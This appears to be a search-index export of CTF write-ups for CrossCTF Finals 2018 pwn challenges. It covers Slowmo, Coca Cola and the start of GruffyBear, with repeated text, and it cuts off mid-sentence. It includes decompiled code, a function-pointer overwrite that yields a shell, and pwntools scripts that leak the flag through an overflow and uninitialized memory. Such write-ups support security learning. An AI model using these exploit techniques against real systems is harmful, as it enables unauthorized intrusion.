0x76u:\n          --*v5;\n          break;\n        case 0x5Eu:\n          ++*v5;\n          break;\n      }\n    }\n    if ( v4 == 33 )\n      break;\n    if ( v4 == 60 )\n      ++v5;\n  }\n  dword_99EBC(v2);\n  result = 0;\n  if ( v7 != dword_97F8C )\n    sub_2AB9C(0);\n  return result;\n}\n\n\n\n\n~~This was where I realised that I hate stripping~~.\nOh well, time to solve.\n\n\nWe can see that we can manipulate where \nptr\n points to and decrement/increment the byte pointed by it. The solution is rather obvious.\n\n\nThe \nptr\n originally points to \ntape+128\n\n\nSolution\n\n\nRight after the \ntape[256]\n array is the \nindirection\n function pointer (in terms of program memory).\nSo we move the pointer by 128 again (send '\n' 128 times).\n\n\nThen increment/decrement the bytes of the function pointer \nindirection\n till it points to \ndos\n instead of \ndis\n(send 'v' or '^' abs(\naddress of dos\n - \naddress of dis\n) number of times, use '^' if \ndos\n is after \ndis\n or 'v' otherwise)\n\n\nCall \nindirection()\n (send '!') and we get shell.\n\n\n\n\nHow do find where \ndos()\n and \ndis()\n are located? The binary is stripped after all.\n\n\n\n\nWell, function names are stripped, but strings are not obfuscated. But we can search for '/bin/date' and '/bin/sh', then find references to these strings.\n\n\n.rodata:00071E9C aBinDate        DCB \n/bin/date\n,0       ; DATA XREF: sub_105B4+8\u2191o\n.rodata:00071E9C                                         ; .text:off_105CC\u2191o\n.rodata:00071EA6                 ALIGN 4\n.rodata:00071EA8 aBinSh_0        DCB \n/bin/sh\n,0         ; DATA XREF: .text:000105D8\u2191o\n.rodata:00071EA8                                         ; .text:off_105E8\u2191o\n\n\n\n\nNext, we see what are the starting addresses of these functions:\n\n\n.text:000105B4 sub_105B4                               ; DATA XREF: sub_105EC+1C\u2193o\n.text:000105B4                                         ; .text:off_10778\u2193o\n.text:000105B4                 STMFD   SP!, {R11,LR}\n.text:000105B8                 ADD     R11, SP, #4\n.text:000105BC                 LDR     R0, =aBinDate   ; \n/bin/date\n\n.text:000105C0                 BL      sub_17428\n.text:000105C4                 NOP\n.text:000105C8                 LDMFD   SP!, {R11,PC}\n.text:000105C8 ; End of function sub_105B4\n.text:000105C8\n.text:000105C8 ; ---------------------------------------------------------------------------\n.text:000105CC off_105CC       DCD aBinDate            ; DATA XREF: sub_105B4+8\u2191r\n.text:000105CC                                         ; \n/bin/date\n\n.text:000105D0 ; ---------------------------------------------------------------------------\n.text:000105D0                 STMFD   SP!, {R11,LR}\n.text:000105D4                 ADD     R11, SP, #4\n.text:000105D8                 LDR     R0, =aBinSh_0   ; \n/bin/sh\n\n.text:000105DC                 BL      sub_17428\n.text:000105E0                 NOP\n.text:000105E4                 LDMFD   SP!, {R11,PC}\n.text:000105E4 ; ---------------------------------------------------------------------------\n.text:000105E8 off_105E8       DCD aBinSh_0            ; DATA XREF: .text:000105D8\u2191r\n.text:000105E8                                         ; \n/bin/sh\n\n.text:000105EC\n\n\n\n\nARM functions (usually) begin with STMFD instructions, so we can ascertain that \ndis()\n is at \n0xB4\n while \ndos()\n is at \n0xD0\n.\n\n\nOur solution is now:\n1. Send \n a total of 128 times\n2. Send ^ a total of (0xD0-0xB4) times\n3. Send !\n4. Profit\n\n\nThe solution script is \nhere", 
            "title": "Slowmo"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/slowmo/README/#crossctf-finals-2018-slowmo-pwn", 
            "text": "", 
            "title": "CrossCTF Finals 2018 : Slowmo (Pwn)"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/slowmo/README/#first-blood-by-osi-layer-8", 
            "text": "What is in this mysterious package?  nc ctf.pwn.sg 4005  Creator - amon (@nn_amon)", 
            "title": "First Blood by : OSI Layer 8"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/slowmo/README/#static-analysis", 
            "text": "Run  file slowmo :  slowmo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=0c6352b62e9c246c5530b20dc13a5d82c60619cc, stripped  Running IDA Pro on the binary, I got code that I originally thought was some sort of language-specific setup code, like Go's runtime initialization. I had no idea what to do, so I went to solve other challenges.  Much later into the competition, the source code was released:  #include  stdio.h \n#include  stdlib.h \n#include  unistd.h \n#include  sys/mman.h \n\nint happy = 0;\n\nvoid (*indirection)();\n\nchar tape[256];\n\nvoid dis() {\n    system( /bin/date );\n}\n\nvoid dos() {\n    system( /bin/sh );\n}\n\nint main() {\n    indirection = dis;\n    char * ptr = tape + 128;\n    alarm(30);\n    char inst;\n    while (1) {\n        if (happy) {\n            for (int i = 0; i   256; i++) {\n                printf( /%02x , tape[i]);\n            }\n            printf( /\\n );\n        }\n        read(0,  inst, 1);\n        switch (inst) {\n            case ' ':\n                ++ptr;\n                break;\n            case ' ':\n                --ptr;\n                break;\n            case '^':\n                *ptr += 1;\n                break;\n            case 'v':\n                *ptr -= 1;\n                break;\n            case '!':\n                indirection();\n                return 0;\n            case '`':\n                happy = 1;\n        }\n    }\n}  I actually had this function in IDA's analysis, but I thought it was some junk:  int __fastcall sub_105EC(int a1, int a2)\n{\n  unsigned int v2; // r0\n  int result; // r0\n  unsigned __int8 v4; // [sp+3h] [bp-11h]\n  _BYTE *v5; // [sp+4h] [bp-10h]\n  int v6; // [sp+8h] [bp-Ch]\n  int v7; // [sp+Ch] [bp-8h]\n\n  v7 = dword_97F8C;\n  dword_99EBC = (int (__fastcall *)(_DWORD))sub_105B4;\n  v5 =  unk_99E3C;\n  sub_279F8(30, a2, (int)sub_105B4,  unk_99E3C);\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        if ( dword_98EEC )\n        {\n          v6 = 0;\n          if ( v6  = 255 )\n            printf( /%02x , byte_99DBC[v6]);\n          sub_17E30();\n        }\n        v2 = sub_28620(0,  v4, (void *)1,  v4);\n        if ( v4 != ' ' )\n          break;\n        --v5;\n      }\n      if ( (signed int)v4  = 62 )\n        break;\n      switch ( v4 )\n      {\n        case 0x60u:\n          dword_98EEC = 1;\n          break;\n        case 0x76u:\n          --*v5;\n          break;\n        case 0x5Eu:\n          ++*v5;\n          break;\n      }\n    }\n    if ( v4 == 33 )\n      break;\n    if ( v4 == 60 )\n      ++v5;\n  }\n  dword_99EBC(v2);\n  result = 0;\n  if ( v7 != dword_97F8C )\n    sub_2AB9C(0);\n  return result;\n}  ~~This was where I realised that I hate stripping~~.\nOh well, time to solve.  We can see that we can manipulate where  ptr  points to and decrement/increment the byte pointed by it. The solution is rather obvious.  The  ptr  originally points to  tape+128", 
            "title": "Static Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/slowmo/README/#solution", 
            "text": "Right after the  tape[256]  array is the  indirection  function pointer (in terms of program memory).\nSo we move the pointer by 128 again (send ' ' 128 times).  Then increment/decrement the bytes of the function pointer  indirection  till it points to  dos  instead of  dis (send 'v' or '^' abs( address of dos  -  address of dis ) number of times, use '^' if  dos  is after  dis  or 'v' otherwise)  Call  indirection()  (send '!') and we get shell.   How do find where  dos()  and  dis()  are located? The binary is stripped after all.   Well, function names are stripped, but strings are not obfuscated. But we can search for '/bin/date' and '/bin/sh', then find references to these strings.  .rodata:00071E9C aBinDate        DCB  /bin/date ,0       ; DATA XREF: sub_105B4+8\u2191o\n.rodata:00071E9C                                         ; .text:off_105CC\u2191o\n.rodata:00071EA6                 ALIGN 4\n.rodata:00071EA8 aBinSh_0        DCB  /bin/sh ,0         ; DATA XREF: .text:000105D8\u2191o\n.rodata:00071EA8                                         ; .text:off_105E8\u2191o  Next, we see what are the starting addresses of these functions:  .text:000105B4 sub_105B4                               ; DATA XREF: sub_105EC+1C\u2193o\n.text:000105B4                                         ; .text:off_10778\u2193o\n.text:000105B4                 STMFD   SP!, {R11,LR}\n.text:000105B8                 ADD     R11, SP, #4\n.text:000105BC                 LDR     R0, =aBinDate   ;  /bin/date \n.text:000105C0                 BL      sub_17428\n.text:000105C4                 NOP\n.text:000105C8                 LDMFD   SP!, {R11,PC}\n.text:000105C8 ; End of function sub_105B4\n.text:000105C8\n.text:000105C8 ; ---------------------------------------------------------------------------\n.text:000105CC off_105CC       DCD aBinDate            ; DATA XREF: sub_105B4+8\u2191r\n.text:000105CC                                         ;  /bin/date \n.text:000105D0 ; ---------------------------------------------------------------------------\n.text:000105D0                 STMFD   SP!, {R11,LR}\n.text:000105D4                 ADD     R11, SP, #4\n.text:000105D8                 LDR     R0, =aBinSh_0   ;  /bin/sh \n.text:000105DC                 BL      sub_17428\n.text:000105E0                 NOP\n.text:000105E4                 LDMFD   SP!, {R11,PC}\n.text:000105E4 ; ---------------------------------------------------------------------------\n.text:000105E8 off_105E8       DCD aBinSh_0            ; DATA XREF: .text:000105D8\u2191r\n.text:000105E8                                         ;  /bin/sh \n.text:000105EC  ARM functions (usually) begin with STMFD instructions, so we can ascertain that  dis()  is at  0xB4  while  dos()  is at  0xD0 .  Our solution is now:\n1. Send   a total of 128 times\n2. Send ^ a total of (0xD0-0xB4) times\n3. Send !\n4. Profit  The solution script is  here", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/cocacola/README/", 
            "text": "CrossCTF Finals 2018 : Coca Cola (Pwn)\n\n\nFirst Blood by : TinyBoxer\n\n\n\n\nCatch the Wave. Coke!\n\n\nnc ctf.pwn.sg 4001\n\n\nCreator - amon (@nn_amon)\n\n\n\n\nStatic Analysis\n\n\nRunning \nfile cocacola\n gives:\n\n\ncocacola: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76986b77e7025662406398594dd7c100f7e35c16, not stripped\n\n\n\n\nNow on to the code ...\n\n\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  unsigned int v3; // eax\n  int result; // eax\n  __off_t v5; // rsi\n  int fd; // [rsp+Ch] [rbp-B4h]\n  struct stat stat_buf; // [rsp+20h] [rbp-A0h]\n  unsigned __int64 v8; // [rsp+B8h] [rbp-8h]\n\n  v8 = __readfsqword(0x28u); // these are canaries btw\n  setvbuf(stdin, 0LL, 2, 0LL); //disallows buffering\n  setvbuf(stdout, 0LL, 2, 0LL);//disallows buffering\n  setvbuf(stderr, 0LL, 2, 0LL);//disallows buffering\n  v3 = time(0LL);\n  srand(v3); //initalize random seed\n  fd = open(\nflag_page\n, 0, 384LL);\n  memset(\nstat_buf, 0, sizeof(stat_buf));\n  if ( fstat(fd, \nstat_buf) == -1 )\n  {\n    perror(\nError getting the file size\n);\n    result = -1;\n  }\n  else\n  {\n    v5 = stat_buf.st_size;\n    mmap((void *)0x700B1000, stat_buf.st_size, 1, 1, fd, 0LL);\n    printf(\nDo you want to flip the flag switch? (y/n) \n);\n    __isoc99_scanf((__int64)\n%2s\n, (__int64)\nflag);\n    coca();\n    cola();\n    puts(\nDid you get it? If not try again.\n);\n    result = 0;\n  }\n  return result;\n}\n\n\n\n\nThe program opens a file called \nflag_page\n. It clears out a \nstat_buf\n region of memory, then uses as a \nstat\n struct when \nfstat(fd, \nstat_buf)\n is called. If \nfstat\n succeeds, \nmmap(0x700B100, stats_buf.size, 1, 1, fd, 0)\n is called.\n\n\nLooking at \nmmap documentation\n, we see that the two \n1\ns that are in the earlier mmap call are for the \nprot\n and \nflags\n arguments. However, note that for the \nfd\n argument, we are passing \nflag_page\n's fd, intending to copy the file content into our allocated memory.\n\n\nNext, it asks us about flipping flag switches (to which the answer is not \ny\n, as we will see later). It reads in 2 bytes into the \nflag\n global variable then proceeds to call \ncoca()\n and then \ncola()\n\n\nunsigned __int64 coca()\n{\n  char buf; // [rsp+0h] [rbp-110h]\n  unsigned __int64 v2; // [rsp+108h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  puts(art);\n  read(0, \nbuf, 0xFFuLL);\n  if ( flag_denied == 0xC5u )\n    read(0, \nsomething, 1uLL);\n  return __readfsqword(0x28u) ^ v2;\n}\n\n\n\n\nWe begin by printing some pretty art, after which we read in 255 bytes into memory. Checking the offsets, we see that there is no overflow here. Next, a global variable \nflag_denied\n is compared to \n0xc5\n, and if it equal we read 1 byte into \nsomething\n, another global variable.\n\n\nunsigned __int64 cola()\n{\n  int v0; // eax\n  signed __int64 v2; // [rsp+0h] [rbp-60h]\n  signed __int64 v3; // [rsp+8h] [rbp-58h]\n  __int64 v4; // [rsp+10h] [rbp-50h]\n  __int64 v5; // [rsp+18h] [rbp-48h]\n  __int64 v6; // [rsp+20h] [rbp-40h]\n  __int64 v7; // [rsp+28h] [rbp-38h]\n  __int64 v8; // [rsp+30h] [rbp-30h]\n  int v9; // [rsp+38h] [rbp-28h]\n  __int16 v10; // [rsp+3Ch] [rbp-24h]\n  const char *v11; // [rsp+48h] [rbp-18h]\n  unsigned __int64 v12; // [rsp+58h] [rbp-8h]\n\n  v12 = __readfsqword(0x28u);\n  v0 = rand();\n  v3 = v0\n     - 10000000000LL\n     * (((signed __int64)((unsigned __int128)(0x36F9BFB3AF7B757LL * (signed __int128)v0) \n 64) \n 27)\n      - ((signed __int64)v0 \n 63))\n     + 1;\n  if ( something )\n  {\n    v2 = '\\x137';\n    strcpy(v4, \nLimited Edition Coca Cola - Product of Mexico\n);\n    v11 = (__int64)\nInvalid internal error.\n;\n  }\n  puts(\nHere's your randomly generated coke can!\n);\n  printf(\nVersion: V.%lu\\n\n, v2, v2);\n  printf(\nSerial Number: %lu\\n\n, v3);\n  printf(\nTitle: %s\\n\n, \nv4);\n  if ( flag == 0x44 \n v11 )\n  {\n    puts(\nErrors were found.\n);\n    printf(\nError: %s\\n\n, v11);\n  }\n  return __readfsqword(0x28u) ^ v12;\n}\n\n\n\n\nIn this method, we get a random number then do some math to get produce another value, then save it into \nv3\n. If \nsomething\n is true, we initalize variables \nv2\n, \nv4\n and \nv11\n. Note that \nv11\n has a pointer to some string, not the string itself. Next, we print out some info, then check if the \nflag\n variable is \n0x44\n and if \nv11\n isn't \nNULL\n, and print \nv11\n out in a \nprint(\"Error: %s\\n\")\n.\n\n\nSolution\n\n\nWe see that if \nsomething\n is \n0\n, when we print out info in \ncola()\n, it prints out values that are uninitialized. Usually, these are values from the previous function call that is made at the same 'level' as the current function (e.g main-\ncoca is on the same 'level' as main-\ncola but main-\ncola is not on the same 'level' as main-\ncola-\nputs). That function is \ncoca()\n, based on main()'s code. If we look at the \nread(0, \nbuf, 0xff)\n, we see that it reads 0xff bytes into buf, which is at rbp-0x110. All the variables in \ncola()\n are from rbp-0x60 onwards, so we can see that we can control all the variables in \ncola\n except \nv0\n, \nv3\n and \nv12\n. Note that \ncola()\n prints out v11 in \nprintf(\"Error: %s\\n\", v11)\n, interpreting it as a string, as long as \nflag\n is \n0x44\n. Thus, we can print out arbitrary memory since we can control v11! We can even print out the contents of \nflag_page\n by setting v11 to \n0x700B1000\n\n\nSo far, we need to set \nflag\n to \n0x44\n, \nsomething\n to 0, and we also need to set \nv11\n to \n0x700B10000\n (this can be done in \ncoca()\n's \nread(0, \nbuf, 0xff)\n)\n\n\nChecking the program, we see that something is actually 1 by default\n\n\n.data:00000000002117F8 something       db    1\n\n\n\n\nThe only place we can change \nsomething\n is in \ncoca()\n:\n\n\nif ( flag_denied == 0xC5u )\n    read(0, \nsomething, 1uLL);\n\n\n\n\nand it seems we need to set \nflag_denied\n to \n0xc5\n first. However, \nflag_denied\n is \n0\n by default, and there is no other place where it is set:\n\n\n.bss:00000000002117FD                 public flag\n.bss:00000000002117FD flag            db    ? ;               ; DATA XREF: cola+12E\u2191o\n.bss:00000000002117FD                                         ; main+14A\u2191o\n.bss:00000000002117FE                 public flag_denied\n.bss:00000000002117FE flag_denied     db    ? ;               ; DATA XREF: coca+42\u2191o\n.bss:00000000002117FF                 db    ? ;\n\n\n\n\nHold on, dont we read 2 bytes into \nflag\n in \nmain()\n? Here it says that \nflag\n is only 1 byte (Note the addresses in left. My tool repeats addresses when delivering information to give .. more information). Thus, we have a overflow, and we can write 1 byte into \nflag_denied\n.\n\n\nSo far, the plan is:\nSet \nflag\n and \nflag_denied\n to 0x44 and 0xc5 respectively, by sending \n\\x44\\xc5\n to \n__isoc99_scanf((__int64)\"%2s\", (__int64)\nflag);\n in \nmain()\n.\n\n\nThen, set v11 (at rbp-0x18) to \n0x700B1000\n in \nread(0, \nbuf, 0xff)\n in \ncoca()\n (buf is rbp-0x110, so we have 0x110-0x18 = 0xf8 characters of padding).\n\nThus, we send \n'a'*0xf8+p64(0x700B1000+i*32)[:-1]\n. The \n[:-1]\n is to leave out the last character, as p64() gives 8 bytes but we can only afford to send 7 bytes (0ff-0f8 = 7). \n\n\nNext, we send \n\\x00\n to \nread(0, \nsomething, 1)\n\n\nPutting it all together:\n\n\nfrom pwn import *\np = remote('ctf.pwn.sg', 4001)\n\np.sendafter(\nDo you want to flip the flag switch? (y/n) \n, '\\x44\\xC5')\np.send('a'*0xf8+p64(0x700B1000)[:-1])\np.send('\\x00')\np.recvuntil('Error: ')\nprint(p.recvline())\n\n\n\n\nHowever ... we get 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC', which isn't the flag, obviously. But 'C' is the first letter of the flag that we expect. Perhaps the file has null bytes that force printf() to stop printing, and the each character of the flag is repeated as above, followed by a null byte? This, along with the \nputs(\"Did you get it? If not try again.\");\n in \nmain()\n imply that we have to repeat our exploit for each character in the flag (we also need to offset our value to v11 by 32*i, where i is the index of the character).\n\nSince we don't know how long the flag is, we just repeat our exploit, for example, 50 times and print what we have so far if the program segfaults early.\n\n\nfrom pwn import *\n\ns = ''\n\nfor i in range(50):\n    try:\n        p = remote('ctf.pwn.sg', 4001)\n\n        p.sendafter(\nDo you want to flip the flag switch? (y/n) \n, '\\x44\\xC5')\n        p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1])\n        p.send('\\x00')\n        p.recvuntil('Error: ')\n        s += p.recv(1)\n    except:\n        break\nprint(s)", 
            "title": "Coca Cola"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/cocacola/README/#crossctf-finals-2018-coca-cola-pwn", 
            "text": "", 
            "title": "CrossCTF Finals 2018 : Coca Cola (Pwn)"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/cocacola/README/#first-blood-by-tinyboxer", 
            "text": "Catch the Wave. Coke!  nc ctf.pwn.sg 4001  Creator - amon (@nn_amon)", 
            "title": "First Blood by : TinyBoxer"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/cocacola/README/#static-analysis", 
            "text": "Running  file cocacola  gives:  cocacola: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76986b77e7025662406398594dd7c100f7e35c16, not stripped  Now on to the code ...  int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  unsigned int v3; // eax\n  int result; // eax\n  __off_t v5; // rsi\n  int fd; // [rsp+Ch] [rbp-B4h]\n  struct stat stat_buf; // [rsp+20h] [rbp-A0h]\n  unsigned __int64 v8; // [rsp+B8h] [rbp-8h]\n\n  v8 = __readfsqword(0x28u); // these are canaries btw\n  setvbuf(stdin, 0LL, 2, 0LL); //disallows buffering\n  setvbuf(stdout, 0LL, 2, 0LL);//disallows buffering\n  setvbuf(stderr, 0LL, 2, 0LL);//disallows buffering\n  v3 = time(0LL);\n  srand(v3); //initalize random seed\n  fd = open( flag_page , 0, 384LL);\n  memset( stat_buf, 0, sizeof(stat_buf));\n  if ( fstat(fd,  stat_buf) == -1 )\n  {\n    perror( Error getting the file size );\n    result = -1;\n  }\n  else\n  {\n    v5 = stat_buf.st_size;\n    mmap((void *)0x700B1000, stat_buf.st_size, 1, 1, fd, 0LL);\n    printf( Do you want to flip the flag switch? (y/n)  );\n    __isoc99_scanf((__int64) %2s , (__int64) flag);\n    coca();\n    cola();\n    puts( Did you get it? If not try again. );\n    result = 0;\n  }\n  return result;\n}  The program opens a file called  flag_page . It clears out a  stat_buf  region of memory, then uses as a  stat  struct when  fstat(fd,  stat_buf)  is called. If  fstat  succeeds,  mmap(0x700B100, stats_buf.size, 1, 1, fd, 0)  is called.  Looking at  mmap documentation , we see that the two  1 s that are in the earlier mmap call are for the  prot  and  flags  arguments. However, note that for the  fd  argument, we are passing  flag_page 's fd, intending to copy the file content into our allocated memory.  Next, it asks us about flipping flag switches (to which the answer is not  y , as we will see later). It reads in 2 bytes into the  flag  global variable then proceeds to call  coca()  and then  cola()  unsigned __int64 coca()\n{\n  char buf; // [rsp+0h] [rbp-110h]\n  unsigned __int64 v2; // [rsp+108h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  puts(art);\n  read(0,  buf, 0xFFuLL);\n  if ( flag_denied == 0xC5u )\n    read(0,  something, 1uLL);\n  return __readfsqword(0x28u) ^ v2;\n}  We begin by printing some pretty art, after which we read in 255 bytes into memory. Checking the offsets, we see that there is no overflow here. Next, a global variable  flag_denied  is compared to  0xc5 , and if it equal we read 1 byte into  something , another global variable.  unsigned __int64 cola()\n{\n  int v0; // eax\n  signed __int64 v2; // [rsp+0h] [rbp-60h]\n  signed __int64 v3; // [rsp+8h] [rbp-58h]\n  __int64 v4; // [rsp+10h] [rbp-50h]\n  __int64 v5; // [rsp+18h] [rbp-48h]\n  __int64 v6; // [rsp+20h] [rbp-40h]\n  __int64 v7; // [rsp+28h] [rbp-38h]\n  __int64 v8; // [rsp+30h] [rbp-30h]\n  int v9; // [rsp+38h] [rbp-28h]\n  __int16 v10; // [rsp+3Ch] [rbp-24h]\n  const char *v11; // [rsp+48h] [rbp-18h]\n  unsigned __int64 v12; // [rsp+58h] [rbp-8h]\n\n  v12 = __readfsqword(0x28u);\n  v0 = rand();\n  v3 = v0\n     - 10000000000LL\n     * (((signed __int64)((unsigned __int128)(0x36F9BFB3AF7B757LL * (signed __int128)v0)   64)   27)\n      - ((signed __int64)v0   63))\n     + 1;\n  if ( something )\n  {\n    v2 = '\\x137';\n    strcpy(v4,  Limited Edition Coca Cola - Product of Mexico );\n    v11 = (__int64) Invalid internal error. ;\n  }\n  puts( Here's your randomly generated coke can! );\n  printf( Version: V.%lu\\n , v2, v2);\n  printf( Serial Number: %lu\\n , v3);\n  printf( Title: %s\\n ,  v4);\n  if ( flag == 0x44   v11 )\n  {\n    puts( Errors were found. );\n    printf( Error: %s\\n , v11);\n  }\n  return __readfsqword(0x28u) ^ v12;\n}  In this method, we get a random number then do some math to get produce another value, then save it into  v3 . If  something  is true, we initalize variables  v2 ,  v4  and  v11 . Note that  v11  has a pointer to some string, not the string itself. Next, we print out some info, then check if the  flag  variable is  0x44  and if  v11  isn't  NULL , and print  v11  out in a  print(\"Error: %s\\n\") .", 
            "title": "Static Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/cocacola/README/#solution", 
            "text": "We see that if  something  is  0 , when we print out info in  cola() , it prints out values that are uninitialized. Usually, these are values from the previous function call that is made at the same 'level' as the current function (e.g main- coca is on the same 'level' as main- cola but main- cola is not on the same 'level' as main- cola- puts). That function is  coca() , based on main()'s code. If we look at the  read(0,  buf, 0xff) , we see that it reads 0xff bytes into buf, which is at rbp-0x110. All the variables in  cola()  are from rbp-0x60 onwards, so we can see that we can control all the variables in  cola  except  v0 ,  v3  and  v12 . Note that  cola()  prints out v11 in  printf(\"Error: %s\\n\", v11) , interpreting it as a string, as long as  flag  is  0x44 . Thus, we can print out arbitrary memory since we can control v11! We can even print out the contents of  flag_page  by setting v11 to  0x700B1000  So far, we need to set  flag  to  0x44 ,  something  to 0, and we also need to set  v11  to  0x700B10000  (this can be done in  coca() 's  read(0,  buf, 0xff) )  Checking the program, we see that something is actually 1 by default  .data:00000000002117F8 something       db    1  The only place we can change  something  is in  coca() :  if ( flag_denied == 0xC5u )\n    read(0,  something, 1uLL);  and it seems we need to set  flag_denied  to  0xc5  first. However,  flag_denied  is  0  by default, and there is no other place where it is set:  .bss:00000000002117FD                 public flag\n.bss:00000000002117FD flag            db    ? ;               ; DATA XREF: cola+12E\u2191o\n.bss:00000000002117FD                                         ; main+14A\u2191o\n.bss:00000000002117FE                 public flag_denied\n.bss:00000000002117FE flag_denied     db    ? ;               ; DATA XREF: coca+42\u2191o\n.bss:00000000002117FF                 db    ? ;  Hold on, dont we read 2 bytes into  flag  in  main() ? Here it says that  flag  is only 1 byte (Note the addresses in left. My tool repeats addresses when delivering information to give .. more information). Thus, we have a overflow, and we can write 1 byte into  flag_denied .  So far, the plan is:\nSet  flag  and  flag_denied  to 0x44 and 0xc5 respectively, by sending  \\x44\\xc5  to  __isoc99_scanf((__int64)\"%2s\", (__int64) flag);  in  main() .  Then, set v11 (at rbp-0x18) to  0x700B1000  in  read(0,  buf, 0xff)  in  coca()  (buf is rbp-0x110, so we have 0x110-0x18 = 0xf8 characters of padding). Thus, we send  'a'*0xf8+p64(0x700B1000+i*32)[:-1] . The  [:-1]  is to leave out the last character, as p64() gives 8 bytes but we can only afford to send 7 bytes (0ff-0f8 = 7).   Next, we send  \\x00  to  read(0,  something, 1)  Putting it all together:  from pwn import *\np = remote('ctf.pwn.sg', 4001)\n\np.sendafter( Do you want to flip the flag switch? (y/n)  , '\\x44\\xC5')\np.send('a'*0xf8+p64(0x700B1000)[:-1])\np.send('\\x00')\np.recvuntil('Error: ')\nprint(p.recvline())  However ... we get 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC', which isn't the flag, obviously. But 'C' is the first letter of the flag that we expect. Perhaps the file has null bytes that force printf() to stop printing, and the each character of the flag is repeated as above, followed by a null byte? This, along with the  puts(\"Did you get it? If not try again.\");  in  main()  imply that we have to repeat our exploit for each character in the flag (we also need to offset our value to v11 by 32*i, where i is the index of the character). Since we don't know how long the flag is, we just repeat our exploit, for example, 50 times and print what we have so far if the program segfaults early.  from pwn import *\n\ns = ''\n\nfor i in range(50):\n    try:\n        p = remote('ctf.pwn.sg', 4001)\n\n        p.sendafter( Do you want to flip the flag switch? (y/n)  , '\\x44\\xC5')\n        p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1])\n        p.send('\\x00')\n        p.recvuntil('Error: ')\n        s += p.recv(1)\n    except:\n        break\nprint(s)", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/pwn/gruffybear/README/", 
            "text": "CrossCTF Finals 2018 : GruffyBear (Pwn)\n\n\nFirst Blood by : N0X10U5 G4S3S\n\n\n\n\nThere's something fishy about this Build-A-Bear workshop...\n\n\nnc ctf.pwn.sg 4002\n\n\nCreator - amon (@nn_amon)\n\n\n\n\nStatic Analysis\n\n\nRunning \nfile gruffybear\n gives:\n\n\ngruffybear: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=405edd7cd41e309d1cab442ffc6a6dad8e782908, not stripped\n\n\n\n\nThe code:\n\n\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+4h] [rbp-24h]\n  unsigned __int64 v5; // [rsp+8h] [rbp-20h]\n\n  v5 = __readfsqword(0x28u);\n  setvbuf(stdin, 0LL, 2, 0LL);\n  setvbuf(stdout, 0LL, 2, 0LL);\n  setvbuf(stderr, 0LL, 2, 0LL);\n  v4 = 999;\n  alarm(0x3Cu);\nLABEL_2:\n  while ( v4 )\n  {\n    while ( 2 )\n    {\n      print_banner();\n      _isoc99_scanf(\n%d\n, \nv4);\n      switch ( v4 )\n      {\n        case 1:\n          build_bear();\n          goto LABEL_2;\n        case 2:\n          select_bear();\n          goto LABEL_2;\n        case 3:\n          delete_bear();\n          goto LABEL_2;\n        case 4:\n          print_bear();\n          goto LABEL_2;\n        case 5:\n          add_comment();\n          goto LABEL_2;\n        case 6:\n          print_comment();\n          goto LABEL_2;\n        case 7:\n          destruction();\n          if ( !v4 )\n            return 0;\n          continue;\n        default:\n          puts(\nNothing to do.\n);\n          break;\n      }\n      break;\n    }\n  }\n  return 0;\n}\n\n\n\n\nmain()\n does some setup like turning off buffering, and calling \nalarm(0x3cu)\n. This sets us on a time limit, after which the program will crash.\n\n\n\n\nMake sure to \nnop\n the call to \nalarm()\n using your tool. e.g. in \nradare2\n you would go to the address of the call then \nwx 9090909090\n .\n\n\n\n\nIn a loop, we print a banner, then get input. Based on the input, we call functions. This is a typical menu-based cli program.\n\n\nunsigned __int64 build_bear()\n{\n  __int64 v0; // rbp\n  bear *v1; // rbx\n  const char *v3; // rbx\n  char buf; // [rsp+7h] [rbp-21h]\n  unsigned __int64 v5; // [rsp+8h] [rbp-20h]\n\n  v5 = __readfsqword(0x28u);\n  v0 = num_bears[0];\n  if ( num_bears[0] \n 12 )\n  {\n    v3 = \nSUNIATRETNE\n;\n    _printf_chk(1LL, \nHere we are now... \n);\n    while ( 1 )\n    {\n      read(0, \nbuf, 1uLL);\n      if ( v3[10] != buf )\n        break;\n      if ( --v3 == \nnt\n )\n      {\n        read(0, \nbuf, 1uLL);\n        admin_enabled = 1;\n        return __readfsqword(0x28u) ^ v5;\n      }\n    }\n  }\n  else\n  {\n    v1 = (bear *)calloc(1uLL, 0xB8uLL);\n    bears[v0] = v1;\n    _printf_chk(1LL, \nBear Name: \n);\n    read(0, v1, 0x1FuLL);\n    _printf_chk(1LL, \nBear ID: \n);\n    _isoc99_scanf(\n%x\n, \nv1-\nid);\n    _printf_chk(1LL, \nBear Age: \n);\n    _isoc99_scanf(\n%d\n, \nv1-\nage);\n    _printf_chk(1LL, \nBear Description: \n);\n    read(0, v1-\ndescription, 0x80uLL);\n    v1-\nfree_function = (__int64)\nfree;\n    v1-\nself_destruct_device_ptr = (__int64)self_destruct_device;\n    puts(\nBear created!\n);\n    ++num_bears[0];\n  }\n  return __readfsqword(0x28u) ^ v5;\n}\n\n\n\n\nThe typical functionality of 